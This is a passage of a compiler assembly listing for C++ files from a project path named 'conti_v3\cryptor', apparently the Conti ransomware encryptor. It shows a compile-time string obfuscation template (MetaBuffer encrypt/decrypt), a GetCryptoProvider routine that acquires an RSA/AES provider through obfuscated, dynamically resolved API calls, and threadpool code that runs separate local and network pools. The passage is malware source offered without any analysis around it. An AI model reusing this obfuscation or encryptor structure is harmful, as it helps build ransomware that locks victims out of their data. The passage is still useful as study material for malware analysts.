  008d1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  008d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008dd	88 41 35	 mov	 BYTE PTR [rcx+53], al
  008e0	b8 01 00 00 00	 mov	 eax, 1
  008e5	48 6b c0 35	 imul	 rax, rax, 53		; 00000035H
  008e9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008f0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008f4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008fb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00900	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00907	88 41 36	 mov	 BYTE PTR [rcx+54], al
  0090a	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00911	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00915	88 85 c0 00 00
	00		 mov	 BYTE PTR tv476[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0091b	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00922	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00929	5f		 pop	 rdi
  0092a	5d		 pop	 rbp
  0092b	c3		 ret	 0
??0?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?GetCryptoProvider@@YAHPEA_K@Z
_TEXT	SEGMENT
bSuccess$ = 4
$T1 = 232
$T2 = 312
$T3 = 400
$T4 = 512
CryptoProvider$ = 640
?GetCryptoProvider@@YAHPEA_K@Z PROC			; GetCryptoProvider, COMDAT

; 36   : {

$LN6:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 98 02
	00 00		 sub	 rsp, 664		; 00000298H
  0000e	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__F03EEA68_threadpool@cpp
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 37   : 	BOOL bSuccess = (BOOL)pCryptAcquireContextA(CryptoProvider, NULL, OBFA(MS_ENH_RSA_AES_PROV_A), PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

  0001f	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0DG@DGPPHCJL@Microsoft?5Enhanced?5RSA?5and?5AES?5@
  00026	48 8d 8d e8 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  0002d	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >
  00032	48 8b c8	 mov	 rcx, rax
  00035	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
  0003a	c7 44 24 20 00
	00 00 f0	 mov	 DWORD PTR [rsp+32], -268435456 ; f0000000H
  00042	41 b9 18 00 00
	00		 mov	 r9d, 24
  00048	4c 8b c0	 mov	 r8, rax
  0004b	33 d2		 xor	 edx, edx
  0004d	48 8b 8d 80 02
	00 00		 mov	 rcx, QWORD PTR CryptoProvider$[rbp]
  00054	e8 00 00 00 00	 call	 ?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z ; pCryptAcquireContextA
  00059	89 45 04	 mov	 DWORD PTR bSuccess$[rbp], eax

; 38   : 	if (bSuccess) {

  0005c	83 7d 04 00	 cmp	 DWORD PTR bSuccess$[rbp], 0
  00060	74 0a		 je	 SHORT $LN2@GetCryptoP

; 39   : 		return TRUE;

  00062	b8 01 00 00 00	 mov	 eax, 1
  00067	e9 d7 00 00 00	 jmp	 $LN1@GetCryptoP
$LN2@GetCryptoP:

; 40   : 	}
; 41   : 
; 42   : 	bSuccess = (BOOL)pCryptAcquireContextA(CryptoProvider, NULL, OBFA(MS_ENH_RSA_AES_PROV_A), PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET);

  0006c	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0DG@DGPPHCJL@Microsoft?5Enhanced?5RSA?5and?5AES?5@
  00073	48 8d 8d 38 01
	00 00		 lea	 rcx, QWORD PTR $T2[rbp]
  0007a	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >
  0007f	48 8b c8	 mov	 rcx, rax
  00082	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
  00087	c7 44 24 20 08
	00 00 f0	 mov	 DWORD PTR [rsp+32], -268435448 ; f0000008H
  0008f	41 b9 18 00 00
	00		 mov	 r9d, 24
  00095	4c 8b c0	 mov	 r8, rax
  00098	33 d2		 xor	 edx, edx
  0009a	48 8b 8d 80 02
	00 00		 mov	 rcx, QWORD PTR CryptoProvider$[rbp]
  000a1	e8 00 00 00 00	 call	 ?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z ; pCryptAcquireContextA
  000a6	89 45 04	 mov	 DWORD PTR bSuccess$[rbp], eax

; 43   : 	if (bSuccess) {

  000a9	83 7d 04 00	 cmp	 DWORD PTR bSuccess$[rbp], 0
  000ad	74 0a		 je	 SHORT $LN3@GetCryptoP

; 44   : 		return TRUE;

  000af	b8 01 00 00 00	 mov	 eax, 1
  000b4	e9 8a 00 00 00	 jmp	 $LN1@GetCryptoP
$LN3@GetCryptoP:

; 45   : 	}
; 46   : 
; 47   : 	bSuccess = (BOOL)pCryptAcquireContextA(CryptoProvider, NULL, OBFA(MS_ENH_RSA_AES_PROV_XP_A), PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

  000b9	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0EC@PDAENLNI@Microsoft?5Enhanced?5RSA?5and?5AES?5@
  000c0	48 8d 8d 90 01
	00 00		 lea	 rcx, QWORD PTR $T3[rbp]
  000c7	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
  000cc	48 8b c8	 mov	 rcx, rax
  000cf	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
  000d4	c7 44 24 20 00
	00 00 f0	 mov	 DWORD PTR [rsp+32], -268435456 ; f0000000H
  000dc	41 b9 18 00 00
	00		 mov	 r9d, 24
  000e2	4c 8b c0	 mov	 r8, rax
  000e5	33 d2		 xor	 edx, edx
  000e7	48 8b 8d 80 02
	00 00		 mov	 rcx, QWORD PTR CryptoProvider$[rbp]
  000ee	e8 00 00 00 00	 call	 ?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z ; pCryptAcquireContextA
  000f3	89 45 04	 mov	 DWORD PTR bSuccess$[rbp], eax

; 48   : 	if (bSuccess) {

  000f6	83 7d 04 00	 cmp	 DWORD PTR bSuccess$[rbp], 0
  000fa	74 07		 je	 SHORT $LN4@GetCryptoP

; 49   : 		return TRUE;

  000fc	b8 01 00 00 00	 mov	 eax, 1
  00101	eb 40		 jmp	 SHORT $LN1@GetCryptoP
$LN4@GetCryptoP:

; 50   : 	}
; 51   : 
; 52   : 	bSuccess = (BOOL)pCryptAcquireContextA(CryptoProvider, NULL, OBFA(MS_ENH_RSA_AES_PROV_XP_A), PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET);

  00103	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0EC@PDAENLNI@Microsoft?5Enhanced?5RSA?5and?5AES?5@
  0010a	48 8d 8d 00 02
	00 00		 lea	 rcx, QWORD PTR $T4[rbp]
  00111	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
  00116	48 8b c8	 mov	 rcx, rax
  00119	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
  0011e	c7 44 24 20 08
	00 00 f0	 mov	 DWORD PTR [rsp+32], -268435448 ; f0000008H
  00126	41 b9 18 00 00
	00		 mov	 r9d, 24
  0012c	4c 8b c0	 mov	 r8, rax
  0012f	33 d2		 xor	 edx, edx
  00131	48 8b 8d 80 02
	00 00		 mov	 rcx, QWORD PTR CryptoProvider$[rbp]
  00138	e8 00 00 00 00	 call	 ?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z ; pCryptAcquireContextA
  0013d	89 45 04	 mov	 DWORD PTR bSuccess$[rbp], eax

; 53   : 	return bSuccess;

  00140	8b 45 04	 mov	 eax, DWORD PTR bSuccess$[rbp]
$LN1@GetCryptoP:

; 54   : }

  00143	48 8d a5 68 02
	00 00		 lea	 rsp, QWORD PTR [rbp+616]
  0014a	5f		 pop	 rdi
  0014b	5d		 pop	 rbp
  0014c	c3		 ret	 0
?GetCryptoProvider@@YAHPEA_K@Z ENDP			; GetCryptoProvider
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??0task_info_@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0task_info_@@QEAA@XZ PROC				; task_info_::task_info_, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0001a	48 8b c8	 mov	 rcx, rax
  0001d	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00022	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
??0task_info_@@QEAA@XZ ENDP				; task_info_::task_info_
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?positive_modulo@@YAHHH@Z
_TEXT	SEGMENT
a$ = 224
n$ = 232
?positive_modulo@@YAHHH@Z PROC				; positive_modulo, COMDAT

; 39   : {

$LN3:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00008	55		 push	 rbp
  00009	57		 push	 rdi
  0000a	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00011	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00016	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001d	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 40   :     return (a % n + n) % n;

  00022	8b 85 e0 00 00
	00		 mov	 eax, DWORD PTR a$[rbp]
  00028	99		 cdq
  00029	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0002f	8b c2		 mov	 eax, edx
  00031	03 85 e8 00 00
	00		 add	 eax, DWORD PTR n$[rbp]
  00037	99		 cdq
  00038	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0003e	8b c2		 mov	 eax, edx

; 41   : }

  00040	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00047	5f		 pop	 rdi
  00048	5d		 pop	 rbp
  00049	c3		 ret	 0
?positive_modulo@@YAHHH@Z ENDP				; positive_modulo
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?Wait@threadpool@@YAXH@Z
_TEXT	SEGMENT
ThreadPoolInfo$ = 8
i$1 = 40
ThreadPoolID$ = 288
?Wait@threadpool@@YAXH@Z PROC				; threadpool::Wait, COMDAT

; 253  : {

$LN10:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__F03EEA68_threadpool@cpp
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 254  : 	PTHREADPOOL_INFO ThreadPoolInfo = NULL;

  0001e	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR ThreadPoolInfo$[rbp], 0

; 255  : 	if (ThreadPoolID == threadpool::LOCAL_THREADPOOL) {

  00026	83 bd 20 01 00
	00 00		 cmp	 DWORD PTR ThreadPoolID$[rbp], 0
  0002d	75 0d		 jne	 SHORT $LN5@Wait

; 256  : 		ThreadPoolInfo = &g_LocalThreadPool;

  0002f	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A ; g_LocalThreadPool
  00036	48 89 45 08	 mov	 QWORD PTR ThreadPoolInfo$[rbp], rax

; 257  : 	}

  0003a	eb 18		 jmp	 SHORT $LN6@Wait
$LN5@Wait:

; 258  : 	else if (ThreadPoolID == threadpool::NETWORK_THREADPOOL) {

  0003c	83 bd 20 01 00
	00 01		 cmp	 DWORD PTR ThreadPoolID$[rbp], 1
  00043	75 0d		 jne	 SHORT $LN7@Wait

; 259  : 		ThreadPoolInfo = &g_NetworkThreadPool;

  00045	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A ; g_NetworkThreadPool
  0004c	48 89 45 08	 mov	 QWORD PTR ThreadPoolInfo$[rbp], rax

; 260  : 	}

  00050	eb 02		 jmp	 SHORT $LN8@Wait
$LN7@Wait:

; 261  : 	else {
; 262  : 		return;

  00052	eb 4f		 jmp	 SHORT $LN1@Wait
$LN8@Wait:
$LN6@Wait:

; 263  : 	}
; 264  : 
; 265  : 	for (SIZE_T i = 0; i < ThreadPoolInfo->ThreadsCount; i++) {

  00054	48 c7 45 28 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0005c	eb 0b		 jmp	 SHORT $LN4@Wait
$LN2@Wait:
  0005e	48 8b 45 28	 mov	 rax, QWORD PTR i$1[rbp]
  00062	48 ff c0	 inc	 rax
  00065	48 89 45 28	 mov	 QWORD PTR i$1[rbp], rax
$LN4@Wait:
  00069	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  0006d	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  00071	48 39 45 28	 cmp	 QWORD PTR i$1[rbp], rax
  00075	73 0d		 jae	 SHORT $LN3@Wait

; 266  : 		PutFinalTask(ThreadPoolID);

  00077	8b 8d 20 01 00
	00		 mov	 ecx, DWORD PTR ThreadPoolID$[rbp]
  0007d	e8 00 00 00 00	 call	 ?PutFinalTask@threadpool@@YAHH@Z ; threadpool::PutFinalTask

; 267  : 	}

  00082	eb da		 jmp	 SHORT $LN2@Wait
$LN3@Wait:

; 268  : 
; 269  : 	pWaitForMultipleObjects(ThreadPoolInfo->ThreadsCount, ThreadPoolInfo->hThreads, TRUE, INFINITE);

  00084	41 b9 ff ff ff
	ff		 mov	 r9d, -1			; ffffffffH
  0008a	41 b8 01 00 00
	00		 mov	 r8d, 1
  00090	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  00094	48 8b 10	 mov	 rdx, QWORD PTR [rax]
  00097	48 8b 45 08	 mov	 rax, QWORD PTR ThreadPoolInfo$[rbp]
  0009b	8b 48 08	 mov	 ecx, DWORD PTR [rax+8]
  0009e	e8 00 00 00 00	 call	 ?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z ; pWaitForMultipleObjects
$LN1@Wait:

; 270  : }

  000a3	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  000aa	5f		 pop	 rdi
  000ab	5d		 pop	 rbp
  000ac	c3		 ret	 0
?Wait@threadpool@@YAXH@Z ENDP				; threadpool::Wait
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?IsActive@threadpool@@YAHH@Z
_TEXT	SEGMENT
ThreadPoolInfo$ = 8
ThreadPoolID$ = 256
?IsActive@threadpool@@YAHH@Z PROC			; threadpool::IsActive, COMDAT

; 236  : {

$LN7:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__F03EEA68_threadpool@cpp
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 237  : 	PTHREADPOOL_INFO ThreadPoolInfo = NULL;

  0001e	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR ThreadPoolInfo$[rbp], 0

; 238  : 	if (ThreadPoolID == threadpool::LOCAL_THREADPOOL) {

  00026	83 bd 00 01 00
	00 00		 cmp	 DWORD PTR ThreadPoolID$[rbp], 0
  0002d	75 0d		 jne	 SHORT $LN2@IsActive

; 239  : 		ThreadPoolInfo = &g_LocalThreadPool;

  0002f	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A ; g_LocalThreadPool
  00036	48 89 45 08	 mov	 QWORD PTR ThreadPoolInfo$[rbp], rax

; 240  : 	}

  0003a	eb 1a		 jmp	 SHORT $LN3@IsActive
$LN2@IsActive:

; 241  : 	else if (ThreadPoolID == threadpool::NETWORK_THREADPOOL) {

  0003c	83 bd 00 01 00
	00 01		 cmp	 DWORD PTR ThreadPoolID$[rbp], 1
  00043	75 0d		 jne	 SHORT $LN4@IsActive

; 242  : 		ThreadPoolInfo = &g_NetworkThreadPool;

  00045	48 8d 05 00 00
